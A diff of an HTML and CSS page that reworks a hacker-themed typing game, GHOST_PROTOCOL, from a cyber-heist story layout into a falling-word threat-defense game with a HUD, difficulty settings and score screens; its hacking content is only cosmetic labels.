@@ -3,870 +3,783 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>GHOST_PROTOCOL — Cyber Heist</title>
-<link rel="preconnect" href="https://fonts.googleapis.com"/>
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=VT323&display=swap" rel="stylesheet"/>
+<title>GHOST_PROTOCOL</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700;900&display=swap" rel="stylesheet"/>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
 :root{
-  --bg:#020408;--bg2:#050c10;--bg3:#071218;--panel:#040a0e;
-  --green:#00ff88;--green2:#00cc66;--green-dim:#003322;--green-faint:#001a10;
-  --cyan:#00e5ff;--cyan-dim:#004455;
-  --red:#ff2244;--red-dim:#330008;
-  --amber:#ffaa00;--amber-dim:#332200;
-  --text:#8aff88;--text2:#4a9948;--text3:#1a3318;
-  --border:rgba(0,255,136,0.12);--border2:rgba(0,255,136,0.28);
-  --mono:'Share Tech Mono',monospace;
-  --display:'Orbitron',monospace;
-  --vt:'VT323',monospace;
+  --bg:#020408; --bg2:#060d12; --panel:#040b0f;
+  --green:#00ff88; --green2:#00cc66; --gdim:#003320; --gfaint:#001a10;
+  --cyan:#00e5ff; --red:#ff2244; --amber:#ffaa00;
+  --text:#7affb0; --text2:#3a8858; --text3:#163325;
+  --b1:rgba(0,255,136,0.10); --b2:rgba(0,255,136,0.25);
+  --mono:'Share Tech Mono',monospace; --disp:'Orbitron',monospace;
 }
-html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--mono);font-size:14px;overflow:hidden;cursor:crosshair;}
-body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,136,0.015) 3px,rgba(0,255,136,0.015) 4px);pointer-events:none;z-index:9000;}
-body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at center,transparent 50%,rgba(0,0,0,0.85) 100%);pointer-events:none;z-index:8999;}
+html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--mono);overflow:hidden;cursor:crosshair;}
+/* scanlines */
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,0.012) 2px,rgba(0,255,136,0.012) 4px);pointer-events:none;z-index:9999;}
+/* vignette */
+body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at center,transparent 45%,rgba(0,0,0,0.8) 100%);pointer-events:none;z-index:9998;}
 
-/* BOOT */
-#boot{position:fixed;inset:0;z-index:1000;background:var(--bg);display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity 0.6s;}
-#boot.hidden{opacity:0;pointer-events:none;}
-#boot-logo{font-family:var(--display);font-size:clamp(32px,8vw,80px);font-weight:900;letter-spacing:0.12em;color:var(--green);text-shadow:0 0 30px rgba(0,255,136,0.6),0 0 80px rgba(0,255,136,0.2);animation:flicker 4s ease infinite;}
-#boot-sub{font-family:var(--display);font-size:clamp(8px,1.5vw,11px);letter-spacing:0.5em;color:var(--text2);margin-top:0.4rem;animation:fadeD 0.5s ease 0.4s both;}
-@keyframes flicker{0%,94%,96%,98%,100%{opacity:1;}95%,97%{opacity:0.5;}}
-@keyframes fadeD{from{opacity:0;}to{opacity:1;}}
-#boot-terminal{margin-top:2rem;width:min(520px,90vw);background:var(--bg2);border:1px solid var(--border2);padding:1.25rem 1.5rem;animation:fadeD 0.5s ease 0.8s both;}
-#boot-lines{font-family:var(--mono);font-size:13px;line-height:2;color:var(--text2);}
-#boot-lines .ok{color:var(--green);}
-#boot-lines .warn{color:var(--amber);}
-#boot-start{margin-top:2rem;font-family:var(--display);font-size:11px;letter-spacing:0.35em;background:transparent;border:1px solid var(--green2);color:var(--green);padding:14px 40px;cursor:pointer;text-transform:uppercase;transition:all 0.2s;animation:fadeD 0.5s ease 2.4s both;box-shadow:0 0 15px rgba(0,255,136,0.1);}
-#boot-start:hover{background:rgba(0,255,136,0.08);box-shadow:0 0 30px rgba(0,255,136,0.25);border-color:var(--green);}
+/* ── CANVAS BG ── */
+#bg-canvas{position:fixed;inset:0;z-index:0;opacity:0.06;}
 
-/* MAIN GRID */
-#game{display:none;height:100vh;grid-template-columns:250px 1fr 210px;grid-template-rows:40px 1fr;}
-#game.on{display:grid;}
+/* ── SCREENS ── */
+.screen{position:fixed;inset:0;z-index:10;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:0;}
+.screen.hide{display:none;}
 
-/* TOP BAR */
-#topbar{grid-column:1/4;display:flex;align-items:center;background:var(--panel);border-bottom:1px solid var(--border);padding:0 1rem;gap:1.2rem;}
-#topbar-logo{font-family:var(--display);font-size:11px;font-weight:700;letter-spacing:0.3em;color:var(--green);text-shadow:0 0 10px rgba(0,255,136,0.5);}
-.tsep{color:var(--text3);font-size:10px;}
-#topbar-mission{font-size:10px;color:var(--text2);letter-spacing:0.15em;}
-#topbar-time{margin-left:auto;font-size:11px;color:var(--text2);}
-#topbar-alert{font-size:9px;letter-spacing:0.2em;padding:3px 10px;border:1px solid;text-transform:uppercase;transition:all 0.3s;}
-#topbar-alert.low{border-color:var(--green-dim);color:var(--green2);}
-#topbar-alert.med{border-color:var(--amber-dim);color:var(--amber);animation:ap 1.5s ease infinite;}
-#topbar-alert.hi{border-color:var(--red-dim);color:var(--red);animation:ap 0.7s ease infinite;}
-@keyframes ap{0%,100%{opacity:1;}50%{opacity:0.4;}}
+/* ── TITLE ── */
+#s-title{background:var(--bg);}
+.logo{font-family:var(--disp);font-size:clamp(40px,9vw,90px);font-weight:900;letter-spacing:0.1em;color:var(--green);text-shadow:0 0 40px rgba(0,255,136,0.5),0 0 100px rgba(0,255,136,0.15);animation:flk 5s ease infinite;}
+.logo-sub{font-family:var(--disp);font-size:clamp(8px,1.5vw,12px);letter-spacing:0.55em;color:var(--text2);margin-top:0.3rem;}
+@keyframes flk{0%,93%,95%,97%,100%{opacity:1;}94%,96%{opacity:0.4;}}
+.divider{width:100px;height:1px;background:var(--b2);margin:2rem 0;}
+.tagline{font-size:13px;color:var(--text2);letter-spacing:0.12em;text-align:center;line-height:2;margin-bottom:2rem;}
+.tagline span{color:var(--green);}
+.diff-row{display:flex;gap:12px;margin-bottom:2rem;}
+.diff-btn{font-family:var(--mono);font-size:10px;letter-spacing:0.2em;text-transform:uppercase;background:transparent;border:1px solid var(--b2);color:var(--text2);padding:10px 22px;cursor:pointer;transition:all 0.15s;}
+.diff-btn:hover,.diff-btn.sel{border-color:var(--green);color:var(--green);background:rgba(0,255,136,0.06);box-shadow:0 0 12px rgba(0,255,136,0.12);}
+.start-btn{font-family:var(--disp);font-size:12px;font-weight:700;letter-spacing:0.35em;background:transparent;border:1px solid var(--green2);color:var(--green);padding:16px 52px;cursor:pointer;transition:all 0.2s;box-shadow:0 0 20px rgba(0,255,136,0.1);}
+.start-btn:hover{background:rgba(0,255,136,0.08);box-shadow:0 0 35px rgba(0,255,136,0.25);}
+.hi-row{display:flex;gap:32px;margin-top:2rem;}
+.hi-item{text-align:center;}
+.hi-label{font-size:9px;letter-spacing:0.25em;color:var(--text3);margin-bottom:3px;text-transform:uppercase;}
+.hi-val{font-size:18px;color:var(--green2);}
 
-/* LEFT */
-#left{background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;}
-.ph{font-family:var(--display);font-size:8px;letter-spacing:0.3em;color:var(--text3);padding:0.55rem 0.9rem;border-bottom:1px solid var(--border);text-transform:uppercase;background:var(--bg2);}
-.ph span{color:var(--green2);}
+/* ── GAME HUD ── */
+#s-game{background:transparent;pointer-events:none;}
+#hud{position:fixed;top:0;left:0;right:0;z-index:20;display:flex;align-items:center;gap:1rem;background:rgba(4,11,15,0.92);border-bottom:1px solid var(--b1);padding:0 1.25rem;height:44px;pointer-events:none;}
+#hud-logo{font-family:var(--disp);font-size:10px;font-weight:700;letter-spacing:0.3em;color:var(--green);text-shadow:0 0 8px rgba(0,255,136,0.4);}
+.hud-sep{color:var(--text3);}
+#hud-wave{font-size:10px;color:var(--text2);letter-spacing:0.2em;}
+#hud-score{font-size:14px;color:var(--green);letter-spacing:0.1em;margin-left:auto;}
+#hud-combo{font-size:10px;color:var(--amber);letter-spacing:0.15em;min-width:80px;text-align:right;}
+/* shields */
+#hud-shields{display:flex;gap:5px;align-items:center;margin-left:1.5rem;}
+.shield-pip{width:14px;height:14px;border:1px solid var(--green2);background:var(--gdim);transition:all 0.3s;box-shadow:0 0 5px rgba(0,255,136,0.2);}
+.shield-pip.dead{border-color:var(--text3);background:transparent;box-shadow:none;}
+/* wpm */
+#hud-wpm{font-size:9px;color:var(--text3);letter-spacing:0.2em;}
+/* threat level */
+#threat-bar-wrap{width:80px;}
+#threat-label{font-size:8px;color:var(--text3);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:3px;}
+#threat-track{height:3px;background:var(--text3);}
+#threat-fill{height:100%;background:var(--green);transition:width 0.5s,background 0.5s;}
 
-#mission-map{padding:0.75rem;}
-.mn{display:flex;align-items:center;gap:8px;padding:7px 8px;margin-bottom:3px;border:1px solid var(--border);transition:all 0.2s;}
-.mn.done{border-color:var(--green-dim);background:var(--green-faint);}
-.mn.active{border-color:var(--green2);background:rgba(0,255,136,0.04);box-shadow:0 0 8px rgba(0,255,136,0.08);}
-.mn.locked{border-color:var(--text3);opacity:0.35;}
-.mi{font-size:12px;width:20px;flex-shrink:0;}
-.ml{font-size:9px;letter-spacing:0.08em;color:var(--text2);}
-.ml.a{color:var(--green);}
-.ml.d{color:var(--green2);}
-.ms{margin-left:auto;font-size:9px;}
-.nc{width:1px;height:10px;background:var(--border2);margin:0 0 3px 18px;}
+/* ── FALLING THREATS ── */
+#threat-field{position:fixed;inset:44px 0 160px 0;z-index:15;overflow:hidden;pointer-events:none;}
+.threat{
+  position:absolute;
+  display:flex;flex-direction:column;align-items:center;gap:4px;
+  transition:top 0.05s linear;
+  pointer-events:none;
+}
+.threat-word{
+  font-family:var(--mono);font-size:clamp(12px,1.8vw,16px);letter-spacing:0.08em;
+  padding:4px 10px;
+  border:1px solid var(--b2);
+  background:rgba(4,11,15,0.85);
+  color:var(--text);
+  white-space:nowrap;
+  position:relative;
+  transition:border-color 0.1s;
+}
+.threat-word .typed{color:var(--green);}
+.threat-word .remaining{color:var(--text);}
+.threat.targeted .threat-word{border-color:var(--cyan);box-shadow:0 0 10px rgba(0,229,255,0.2);color:var(--cyan);}
+.threat.targeted .threat-word .typed{color:var(--green);}
+.threat.targeted .threat-word .remaining{color:var(--cyan);}
+.threat-bar{width:100%;height:2px;background:var(--green);transform-origin:left;transition:transform 0.1s linear;}
+.threat-bar.urgent{background:var(--red);}
+.threat-bar.warn{background:var(--amber);}
+/* category badge */
+.threat-cat{font-size:8px;letter-spacing:0.2em;color:var(--text3);text-transform:uppercase;}
 
-#stats-section{padding:0.9rem;border-top:1px solid var(--border);}
-.si{margin-bottom:10px;}
-.sh{display:flex;justify-content:space-between;font-size:9px;letter-spacing:0.15em;color:var(--text2);margin-bottom:4px;text-transform:uppercase;}
-.sv{color:var(--green);}
-.st{height:2px;background:var(--text3);}
-.sf{height:100%;background:linear-gradient(90deg,var(--green-dim),var(--green));transition:width 0.6s ease;box-shadow:0 0 5px rgba(0,255,136,0.4);}
-.sf.red{background:linear-gradient(90deg,var(--red-dim),var(--red));box-shadow:0 0 5px rgba(255,34,68,0.4);}
-.sf.amb{background:linear-gradient(90deg,var(--amber-dim),var(--amber));box-shadow:0 0 5px rgba(255,170,0,0.4);}
-
-#inv-section{padding:0.75rem;border-top:1px solid var(--border);margin-top:auto;}
-.ii{display:flex;align-items:center;gap:7px;padding:4px 0;border-bottom:1px solid var(--border);font-size:9px;color:var(--text2);}
-.ii:last-child{border-bottom:none;}
-.ic{font-size:11px;}
-.ia{color:var(--green);}
-.il{color:var(--text3);}
-
-/* CENTER */
-#center{background:var(--bg2);display:flex;flex-direction:column;overflow:hidden;position:relative;}
-#matrix-canvas{position:absolute;inset:0;opacity:0.035;pointer-events:none;z-index:0;}
-#terminal-out{flex:1;overflow-y:auto;padding:1.25rem 1.5rem;position:relative;z-index:1;scroll-behavior:smooth;}
-#terminal-out::-webkit-scrollbar{width:2px;}
-#terminal-out::-webkit-scrollbar-thumb{background:var(--green-dim);}
-
-.tl{line-height:1.9;font-size:13px;animation:tli 0.15s ease;}
-@keyframes tli{from{opacity:0;}to{opacity:1;}}
-.t-sys{color:var(--text3);font-size:11px;}
-.t-prompt{color:var(--green2);}
-.t-resp{color:var(--text);}
-.t-ok{color:var(--green);text-shadow:0 0 8px rgba(0,255,136,0.4);}
-.t-err{color:var(--red);}
-.t-warn{color:var(--amber);}
-.t-story{color:var(--text2);font-family:var(--vt);font-size:17px;line-height:1.65;margin:0.3rem 0;}
-.t-npc{color:var(--cyan);font-size:13px;}
-.t-hdr{font-family:var(--display);font-size:10px;letter-spacing:0.3em;color:var(--green);border-bottom:1px solid var(--border);padding-bottom:5px;margin:1rem 0 0.4rem;text-shadow:0 0 10px rgba(0,255,136,0.3);}
-.t-div{color:var(--text3);font-size:11px;margin:0.2rem 0;}
-
-/* BOTTOM */
-#bottom{border-top:1px solid var(--border);background:var(--panel);display:flex;flex-direction:column;position:relative;z-index:1;}
-#choices{display:none;flex-wrap:wrap;gap:5px;padding:0.65rem 1.25rem 0;}
-#choices.show{display:flex;}
-.ch{font-family:var(--mono);font-size:9px;letter-spacing:0.12em;background:transparent;border:1px solid var(--border2);color:var(--text2);padding:5px 12px;cursor:pointer;text-transform:uppercase;transition:all 0.15s;}
-.ch:hover{border-color:var(--green);color:var(--green);background:rgba(0,255,136,0.05);box-shadow:0 0 8px rgba(0,255,136,0.08);}
-.ch.locked{border-color:var(--text3);color:var(--text3);cursor:default;}
-.req{font-size:7px;color:var(--amber);margin-left:5px;}
-
-#type-row{display:flex;align-items:center;gap:0;padding:0.5rem 1.25rem 0.6rem;}
-#pfx{font-size:12px;color:var(--green2);white-space:nowrap;padding-right:7px;flex-shrink:0;}
-#tdisp{flex:1;font-size:13px;min-height:18px;position:relative;}
-#tdisp .cc{color:var(--green);}
-#tdisp .cw{color:var(--red);}
-#tdisp .cp{color:var(--text3);}
-#tdisp .cur{display:inline-block;width:7px;height:13px;background:var(--green);vertical-align:middle;animation:cb 0.8s step-end infinite;box-shadow:0 0 5px var(--green);}
+/* ── INPUT ZONE ── */
+#input-zone{
+  position:fixed;bottom:0;left:0;right:0;z-index:20;
+  background:rgba(4,11,15,0.95);
+  border-top:1px solid var(--b2);
+  padding:0.75rem 1.5rem;
+}
+#input-row{display:flex;align-items:center;gap:0;}
+#input-prefix{font-size:13px;color:var(--green2);white-space:nowrap;padding-right:8px;flex-shrink:0;}
+#input-display{flex:1;font-size:16px;min-height:22px;}
+#input-display .ic{color:var(--green);}
+#input-display .iw{color:var(--red);}
+#input-display .cur{display:inline-block;width:8px;height:16px;background:var(--green);vertical-align:middle;animation:cb 0.8s step-end infinite;box-shadow:0 0 6px var(--green);}
 @keyframes cb{0%,100%{opacity:1;}50%{opacity:0;}}
-#real-input{position:absolute;opacity:0;width:1px;height:1px;top:0;left:0;pointer-events:none;}
+#real-input{position:absolute;opacity:0;width:1px;height:1px;pointer-events:none;}
+#status-row{display:flex;align-items:center;gap:1.5rem;margin-top:5px;border-top:1px solid var(--b1);padding-top:5px;}
+#status-hint{font-size:9px;color:var(--text3);letter-spacing:0.15em;flex:1;}
+#status-hint span{color:var(--amber);}
+#status-accuracy{font-size:9px;color:var(--text3);letter-spacing:0.15em;}
+#status-accuracy span{color:var(--green2);}
 
-#hint-bar{display:flex;align-items:center;gap:1rem;padding:2px 1.25rem 0.5rem;border-top:1px solid var(--border);}
-#hint-txt{font-size:9px;color:var(--text3);letter-spacing:0.12em;}
-#hint-txt span{color:var(--amber);}
-#wpm-d{margin-left:auto;font-size:9px;color:var(--text3);}
-#wpm-d span{color:var(--green2);}
-
-/* RIGHT */
-#right{background:var(--panel);border-left:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;}
-#net-viz{padding:0.6rem;border-bottom:1px solid var(--border);}
-#net-canvas{width:100%;height:110px;display:block;}
-#activity-log{flex:1;overflow-y:auto;padding:0.4rem 0.65rem;}
-#activity-log::-webkit-scrollbar{width:2px;}
-#activity-log::-webkit-scrollbar-thumb{background:var(--green-dim);}
-.le{font-size:9px;line-height:1.9;border-bottom:1px solid var(--border);padding:3px 0;color:var(--text3);animation:tli 0.2s ease;}
-.lt{color:var(--green-dim);}
-.lm{color:var(--text2);}
-.lok{color:var(--green);}
-.lwn{color:var(--amber);}
-.ler{color:var(--red);}
-
-#ids-section{padding:0.65rem;border-top:1px solid var(--border);}
-.ids-lbl{font-family:var(--display);font-size:7px;letter-spacing:0.2em;color:var(--text3);margin-bottom:5px;text-transform:uppercase;}
-#ids-track{height:6px;background:var(--text3);overflow:hidden;}
-#ids-fill{height:100%;background:var(--green);transition:width 0.5s ease,background 0.5s;box-shadow:0 0 6px var(--green);}
-#ids-pct{font-size:10px;color:var(--green);margin-top:3px;text-align:right;transition:color 0.5s;}
-
-/* MINI GAME */
-#mg-overlay{display:none;position:fixed;inset:0;z-index:500;background:rgba(2,4,8,0.96);align-items:center;justify-content:center;flex-direction:column;gap:1.25rem;}
-#mg-overlay.show{display:flex;}
-#mg-title{font-family:var(--display);font-size:12px;letter-spacing:0.4em;color:var(--green);text-shadow:0 0 20px rgba(0,255,136,0.5);}
-#mg-box{width:min(560px,92vw);background:var(--bg2);border:1px solid var(--border2);padding:1.5rem;box-shadow:0 0 40px rgba(0,255,136,0.08);}
-#mg-inst{font-size:11px;color:var(--text2);margin-bottom:1rem;letter-spacing:0.04em;line-height:1.7;}
-#mg-prompt{font-family:var(--mono);font-size:14px;letter-spacing:0.06em;line-height:2.2;margin-bottom:1rem;word-break:break-all;min-height:30px;}
-#mg-input{width:100%;background:rgba(0,0,0,0.5);border:1px solid var(--border2);color:var(--green);font-family:var(--mono);font-size:13px;padding:9px 13px;outline:none;caret-color:var(--green);transition:border-color 0.2s,box-shadow 0.2s;}
-#mg-input:focus{border-color:var(--green2);box-shadow:0 0 0 1px var(--green-dim);}
-#mg-input.err{border-color:var(--red);box-shadow:0 0 8px rgba(255,34,68,0.2);}
-#mg-input.ok2{border-color:var(--green);box-shadow:0 0 8px rgba(0,255,136,0.25);}
-#mg-meta{display:flex;justify-content:space-between;align-items:center;margin-top:0.6rem;}
-#mg-pbar{width:180px;height:2px;background:var(--text3);}
-#mg-pfill{height:100%;background:var(--green);transition:width 0.3s;}
-#mg-timer{font-size:10px;color:var(--amber);}
-#mg-wpm{font-size:10px;color:var(--text2);}
-
-/* NOTIFS */
-#notifs{position:fixed;top:48px;right:220px;z-index:400;display:flex;flex-direction:column;gap:5px;pointer-events:none;}
-.notif{font-family:var(--mono);font-size:9px;letter-spacing:0.18em;text-transform:uppercase;padding:6px 12px;border-left:2px solid;animation:ns 0.3s ease;max-width:260px;}
-.notif.ok{background:rgba(0,255,136,0.05);border-color:var(--green);color:var(--green);}
-.notif.bad{background:rgba(255,34,68,0.05);border-color:var(--red);color:var(--red);}
-.notif.info{background:rgba(0,229,255,0.05);border-color:var(--cyan);color:var(--cyan);}
-.notif.warn{background:rgba(255,170,0,0.05);border-color:var(--amber);color:var(--amber);}
-@keyframes ns{from{opacity:0;transform:translateX(8px);}to{opacity:1;transform:none;}}
-
-@media(max-width:720px){
-  #game{grid-template-columns:1fr;grid-template-rows:40px 1fr;}
-  #left,#right{display:none;}
-  #center{grid-column:1;}
+/* ── EFFECTS ── */
+.boom{position:absolute;pointer-events:none;z-index:50;animation:boomAnim 0.45s ease forwards;}
+@keyframes boomAnim{
+  0%{opacity:1;transform:scale(0.5);}
+  50%{opacity:1;transform:scale(1.4);}
+  100%{opacity:0;transform:scale(1.8);}
 }
+.boom-ring{
+  width:40px;height:40px;border-radius:50%;
+  border:2px solid var(--green);
+  box-shadow:0 0 10px var(--green);
+}
+.miss-flash{position:fixed;inset:0;background:rgba(255,34,68,0.08);pointer-events:none;z-index:100;animation:mf 0.3s ease forwards;}
+@keyframes mf{0%{opacity:1;}100%{opacity:0;}}
+
+/* ── WAVE BANNER ── */
+#wave-banner{
+  position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
+  z-index:200;text-align:center;pointer-events:none;
+  display:none;
+}
+#wave-banner.show{display:block;animation:wb 1.6s ease forwards;}
+@keyframes wb{0%{opacity:0;transform:translate(-50%,-50%) scale(0.8);}20%{opacity:1;transform:translate(-50%,-50%) scale(1);}80%{opacity:1;transform:translate(-50%,-50%) scale(1);}100%{opacity:0;transform:translate(-50%,-50%) scale(1.05);}}
+.wb-num{font-family:var(--disp);font-size:clamp(36px,8vw,72px);font-weight:900;color:var(--green);text-shadow:0 0 40px rgba(0,255,136,0.6);letter-spacing:0.1em;}
+.wb-sub{font-family:var(--mono);font-size:12px;letter-spacing:0.3em;color:var(--text2);margin-top:4px;}
+
+/* ── GAME OVER / WIN ── */
+#s-over{background:rgba(2,4,8,0.97);}
+.over-title{font-family:var(--disp);font-size:clamp(32px,7vw,64px);font-weight:900;letter-spacing:0.1em;margin-bottom:0.5rem;}
+.over-title.fail{color:var(--red);text-shadow:0 0 30px rgba(255,34,68,0.4);}
+.over-title.win{color:var(--green);text-shadow:0 0 30px rgba(0,255,136,0.4);}
+.over-msg{font-size:13px;color:var(--text2);letter-spacing:0.1em;margin-bottom:2rem;text-align:center;line-height:1.8;}
+.stat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:2rem;width:min(520px,90vw);}
+.stat-box{background:var(--bg2);border:1px solid var(--b1);padding:0.75rem;text-align:center;}
+.stat-box-label{font-size:8px;letter-spacing:0.2em;color:var(--text3);margin-bottom:4px;text-transform:uppercase;}
+.stat-box-val{font-size:20px;color:var(--green);}
+.btn-row{display:flex;gap:12px;}
+
+/* ── PAUSE ── */
+#pause-overlay{display:none;position:fixed;inset:0;z-index:300;background:rgba(2,4,8,0.92);align-items:center;justify-content:center;flex-direction:column;gap:1rem;}
+#pause-overlay.show{display:flex;}
+.pause-title{font-family:var(--disp);font-size:28px;font-weight:700;letter-spacing:0.3em;color:var(--green);}
+.pause-hint{font-size:11px;color:var(--text2);letter-spacing:0.2em;}
+
+/* ── COMBO POPUP ── */
+.combo-popup{
+  position:fixed;z-index:150;pointer-events:none;
+  font-family:var(--disp);font-size:clamp(14px,2.5vw,22px);font-weight:700;
+  letter-spacing:0.15em;color:var(--amber);
+  text-shadow:0 0 15px rgba(255,170,0,0.5);
+  animation:cp 0.9s ease forwards;
+}
+@keyframes cp{0%{opacity:1;transform:translateY(0) scale(1);}100%{opacity:0;transform:translateY(-50px) scale(1.3);}}
 </style>
 </head>
 <body>
 
-<!-- BOOT -->
-<div id="boot">
-  <div id="boot-logo">GHOST_PROTOCOL</div>
-  <div id="boot-sub">CYBER HEIST SIMULATION v3.1.4</div>
-  <div id="boot-terminal">
-    <div id="boot-lines"></div>
+<canvas id="bg-canvas"></canvas>
+
+<!-- TITLE -->
+<div class="screen" id="s-title">
+  <div class="logo">GHOST_PROTOCOL</div>
+  <div class="logo-sub">CYBER THREAT RESPONSE UNIT</div>
+  <div class="divider"></div>
+  <p class="tagline">Incoming cyber threats detected.<br>Type the command strings to <span>neutralize</span> each one.</p>
+  <div class="diff-row">
+    <button class="diff-btn sel" id="d-easy" onclick="setDiff('easy')">EASY</button>
+    <button class="diff-btn" id="d-med" onclick="setDiff('medium')">MEDIUM</button>
+    <button class="diff-btn" id="d-hard" onclick="setDiff('hard')">HARD</button>
+    <button class="diff-btn" id="d-elite" onclick="setDiff('elite')">ELITE</button>
   </div>
-  <button id="boot-start" style="display:none" onclick="startGame()">INITIALIZE MISSION</button>
+  <button class="start-btn" onclick="startGame()">DEPLOY</button>
+  <div class="hi-row">
+    <div class="hi-item"><div class="hi-label">Best Score</div><div class="hi-val" id="hi-score">0</div></div>
+    <div class="hi-item"><div class="hi-label">Best WPM</div><div class="hi-val" id="hi-wpm">0</div></div>
+    <div class="hi-item"><div class="hi-label">Best Wave</div><div class="hi-val" id="hi-wave">0</div></div>
+  </div>
 </div>
 
 <!-- GAME -->
-<div id="game">
-  <div id="topbar">
-    <div id="topbar-logo">GHOST_PROTOCOL</div>
-    <div class="tsep">//</div>
-    <div id="topbar-mission">OP: BLACKVAULT</div>
-    <div class="tsep">//</div>
-    <div id="topbar-alert" class="low">THREAT: LOW</div>
-    <div id="topbar-time">00:00:00</div>
-  </div>
-
-  <!-- LEFT -->
-  <div id="left">
-    <div class="ph">MISSION MAP <span>// OP-07</span></div>
-    <div id="mission-map"></div>
-    <div id="stats-section">
-      <div class="ph" style="margin:-1px -0.9rem 0.85rem;padding:0.55rem 0.9rem;">OPERATOR STATS</div>
-      <div class="si"><div class="sh"><span>STEALTH</span><span class="sv" id="sv-stealth">85</span></div><div class="st"><div class="sf" id="sf-stealth" style="width:85%"></div></div></div>
-      <div class="si"><div class="sh"><span>HACKING</span><span class="sv" id="sv-hacking">70</span></div><div class="st"><div class="sf" id="sf-hacking" style="width:70%"></div></div></div>
-      <div class="si"><div class="sh"><span>SOCIAL ENG</span><span class="sv" id="sv-social">60</span></div><div class="st"><div class="sf amb" id="sf-social" style="width:60%"></div></div></div>
-      <div class="si"><div class="sh"><span>HEAT</span><span class="sv" id="sv-heat" style="color:var(--red)">5</span></div><div class="st"><div class="sf red" id="sf-heat" style="width:5%"></div></div></div>
+<div class="screen hide" id="s-game">
+  <div id="hud">
+    <div id="hud-logo">GHOST_PROTOCOL</div>
+    <div class="hud-sep">//</div>
+    <div id="hud-wave">WAVE 1</div>
+    <div id="hud-shields"></div>
+    <div id="threat-bar-wrap">
+      <div id="threat-label">THREAT</div>
+      <div id="threat-track"><div id="threat-fill" style="width:0%"></div></div>
     </div>
-    <div id="inv-section">
-      <div class="ph" style="margin:-1px -0.75rem 0.65rem;padding:0.55rem 0.75rem;">TOOLKIT</div>
-      <div class="ii"><span class="ic">🔐</span><span class="ia">RSA Keygen</span></div>
-      <div class="ii"><span class="ic">📡</span><span class="ia">Packet Sniffer</span></div>
-      <div class="ii"><span class="ic">🛡️</span><span class="il">VPN Tunnel [LOCKED]</span></div>
-      <div class="ii"><span class="ic">💉</span><span class="il" id="inv-sql">SQL Injector [LOCKED]</span></div>
-    </div>
+    <div id="hud-wpm">WPM: —</div>
+    <div id="hud-combo"></div>
+    <div id="hud-score">0</div>
   </div>
-
-  <!-- CENTER -->
-  <div id="center">
-    <canvas id="matrix-canvas"></canvas>
-    <div id="terminal-out"></div>
-    <div id="bottom">
-      <div id="choices"></div>
-      <div id="type-row">
-        <div id="pfx">ghost@blackvault:~$&nbsp;</div>
-        <div id="tdisp"><span class="cur"></span></div>
-        <input id="real-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"/>
-      </div>
-      <div id="hint-bar">
-        <div id="hint-txt">TYPE COMMAND TO PROCEED</div>
-        <div id="wpm-d">WPM:&nbsp;<span id="wpm-val">—</span></div>
-      </div>
+  <div id="threat-field"></div>
+  <div id="input-zone">
+    <div id="input-row">
+      <div id="input-prefix">ghost@terminal:~$&nbsp;</div>
+      <div id="input-display"><span class="cur"></span></div>
+      <input id="real-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"/>
     </div>
-  </div>
-
-  <!-- RIGHT -->
-  <div id="right">
-    <div class="ph">NETWORK <span>// LIVE</span></div>
-    <div id="net-viz"><canvas id="net-canvas"></canvas></div>
-    <div class="ph">ACTIVITY LOG</div>
-    <div id="activity-log"></div>
-    <div id="ids-section">
-      <div class="ids-lbl">INTRUSION DETECTION</div>
-      <div id="ids-track"><div id="ids-fill" style="width:5%"></div></div>
-      <div id="ids-pct">5%</div>
+    <div id="status-row">
+      <div id="status-hint">TYPE TO TARGET &amp; NEUTRALIZE THREATS</div>
+      <div id="status-accuracy">ACC: <span id="acc-val">100%</span></div>
     </div>
   </div>
 </div>
 
-<!-- MINI GAME -->
-<div id="mg-overlay">
-  <div id="mg-title">BREACH IN PROGRESS</div>
-  <div id="mg-box">
-    <div id="mg-inst"></div>
-    <div id="mg-prompt"></div>
-    <input id="mg-input" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="Type here..."/>
-    <div id="mg-meta">
-      <div><div id="mg-pbar"><div id="mg-pfill" style="width:0%"></div></div></div>
-      <div id="mg-timer">60s</div>
-      <div id="mg-wpm">WPM: —</div>
-    </div>
+<!-- WAVE BANNER -->
+<div id="wave-banner">
+  <div class="wb-num" id="wb-num"></div>
+  <div class="wb-sub" id="wb-sub"></div>
+</div>
+
+<!-- GAME OVER -->
+<div class="screen hide" id="s-over">
+  <div class="over-title" id="over-title">SYSTEM COMPROMISED</div>
+  <div class="over-msg" id="over-msg"></div>
+  <div class="stat-grid">
+    <div class="stat-box"><div class="stat-box-label">Score</div><div class="stat-box-val" id="res-score">0</div></div>
+    <div class="stat-box"><div class="stat-box-label">Wave</div><div class="stat-box-val" id="res-wave">0</div></div>
+    <div class="stat-box"><div class="stat-box-label">WPM</div><div class="stat-box-val" id="res-wpm">0</div></div>
+    <div class="stat-box"><div class="stat-box-label">Accuracy</div><div class="stat-box-val" id="res-acc">0%</div></div>
+  </div>
+  <div class="btn-row">
+    <button class="start-btn" onclick="restartGame()">REDEPLOY</button>
+    <button class="start-btn" style="border-color:var(--text2);color:var(--text2);" onclick="goTitle()">MAIN MENU</button>
   </div>
 </div>
 
-<div id="notifs"></div>
